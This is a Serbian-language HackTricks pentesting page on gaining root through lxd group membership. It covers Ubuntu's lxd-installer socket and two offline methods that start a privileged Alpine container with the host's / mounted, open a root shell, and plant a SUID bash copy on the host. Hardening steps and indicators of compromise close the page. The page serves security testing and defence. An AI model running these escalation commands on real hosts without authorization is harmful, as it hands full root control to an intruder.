# lxd/lxc grupa - Eskalacija privilegija

{{#include ../../../banners/hacktricks-training.md}}

Članstvo u host grupi za upravljanje LXD-om (obično _**lxd**_) može omogućiti put do root-a tako što pruža potpunu kontrolu nad daemon-om.<sup>[[1]](#references)</sup> Ovo je isti problem granice poverenja opisan za [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) i [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): pristup API-ju za upravljanje može biti dovoljan čak i kada se trenutni proces već ne nalazi unutar kontejnera.<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` aktivacija socket-a

Nemojte pretpostavljati da je članstvo u grupi `lxd` bezopasno samo zato što LXD snap nije instaliran. Na Ubuntu Server 24.04 i novijim verzijama, unapred instalirani paket `lxd-installer` izlaže `/run/lxd-installer.socket` kao `root:lxd` sa režimom `0660`. Povezivanje aktivira `lxd-installer@.service` kao root, koji instalira LXD snap bez sudo lozinke ili polkit autorizacije; neke verzije wrapper-a izostavljaju i upit za potvrdu kada standardni ulaz nije TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Pregledajte i članstvo naloga u grupama i service koji se aktivira preko socket-a:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Ovlašćeni test iz grupe `lxd` može da aktivira instalater preko uobičajenog `lxc` wrappera ili direktnim povezivanjem na socket. Ovo drugo pokazuje da je ACL Unix socketa, a ne prompt wrappera, stvarna granica autorizacije:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Kada daemon bude dostupan, nastavite sa tehnikama za privilegovane kontejnere u nastavku.<sup>[[10]](#references)[[11]](#references)</sup>

## Eksploatacija bez interneta

### Metod 1

Možete preuzeti Alpine image za korišćenje sa LXD-a iz pouzdanog repozitorijuma.
Canonical-ov LXD image server objavljuje dnevne buildove: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Preuzmite **lxd.tar.xz** i **rootfs.squashfs** iz najnovijeg builda (ime direktorijuma je datum).<sup>[[8]](#references)</sup>

Druga mogućnost je da instalirate distrobuilder na svojoj mašini prateći [uputstva projekta](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Otpremite **incus.tar.xz** (**lxd.tar.xz** ako ste preuzeli sa Canonical image servera) i **rootfs.squashfs**, zatim uvezite image i kreirajte container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Ako naiđete na ovu grešku _**Greška: Nije pronađen storage pool. Napravite novi storage pool**_\
> Pokrenite **`lxd init`**, podesite podrazumevani storage pool, a zatim **ponovite** prethodni niz komandi.<sup>[[2]](#references)</sup>

Na kraju pokrenite container i otvorite root shell na filesystem-u hosta:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Pošto UID 0 u ovoj privilegovanoj instanci nije remapiran, može da kreira SUID payload u vlasništvu hosta kroz montirani root hosta. Time se dovršava pivot iz kontejnera na host, umesto da operator ostane u shell-u kontejnera:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Postavite payload na filesystem koji podržava SUID. Zaseban `/tmp` je često montiran sa opcijom `nosuid` i možda neće biti dostupan ispod nerekurzivnog bind mount-a host `/`, pa je putanja kao što je `/rootbash` na root filesystem-u hosta pouzdanija za ovu demonstraciju.<sup>[[10]](#references)[[11]](#references)</sup>

### Metod 2

Napravite Alpine image i pokrenite ga sa opcijom `security.privileged=true`, koja mapira root korisnika kontejnera na root korisnika hosta; montiranje `/` zatim izlaže filesystem hosta unutar kontejnera.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Sporedni efekat AppArmor-a na nivou celog hosta

Pokretanje LXD snap paketa može da upiše i `/run/sysctl.d/zz-lxd.conf` i postavi vrednosti za `kernel.apparmor_restrict_unprivileged_userns` i `kernel.apparmor_restrict_unprivileged_unconfined` na `0`. Time se slabe Ubuntu-ova ograničenja za neprivilegovane korisničke prostore imena za sve lokalne korisnike, zato zabeležite vrednosti pre i posle aktiviranja LXD-a prilikom procene hosta.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Revizija i ojačavanje

Članstvo u `lxd` grupi tretirajte kao dodelu root privilegija. Uklanjanje nepotrebnog člana stupa na snagu za nove sesije prijavljivanja; uklanjanjem paketa `lxd-installer` ili maskiranjem njegovog socket-a uklanja se samo putanja za instalaciju na zahtev i **ne** ograničava se korisnik koji već može da pristupi instaliranom LXD daemon-u.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Korisni indikatori kompromitovanja uključuju LXD instance sa `security.privileged=true`, disk uređaje čiji je `source` `/`, neočekivane konekcije ka `/run/lxd-installer.socket`, nove SUID fajlove i promenu vrednosti prethodno navedenih AppArmor sysctl parametara sa `1` na `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Kako ojačati bezbednost za LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD kontejneri i virtuelne mašine](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Kako kopirati i uvoziti image-e](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Kako praviti image-e pomoću distrobuilder-a](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definicija Alpine image-a](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Skripta za pravljenje lxd-alpine-builder-a](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Tip: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR Labs izveštaj o eskalaciji privilegija kroz LXD grupu i PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Staro vino u novoj boci: Deceniju stara LXD grupa ponovo naoružana za root pristup](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
